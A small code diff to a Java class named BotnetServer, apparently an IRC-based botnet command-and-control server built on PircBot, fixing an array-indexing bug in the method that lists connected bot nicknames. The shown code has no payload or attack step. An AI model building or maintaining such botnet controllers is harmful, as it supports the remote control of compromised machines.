@@ -344,13 +344,13 @@ public class BotnetServer extends PircBot {
 	
 	public String[] getUserNames() {
 		User[] bots = getUsers(CHANNEL);
-		String[] names = new String[bots.length - 1];
-		for (int i = 0; i < bots.length; i++) {
-			if (!bots[i].getNick().equalsIgnoreCase(NAME)) {
-				names[i] = bots[i].getNick();
+		List<String> namesList = new ArrayList<String>();
+		for (User bot : bots) {
+			if (!bot.getNick().equalsIgnoreCase(NAME)) {
+				namesList.add(bot.getNick());
 			}
 		}
-		return names;
+		return namesList.toArray(new String[0]);
 	}
 	
 	/**
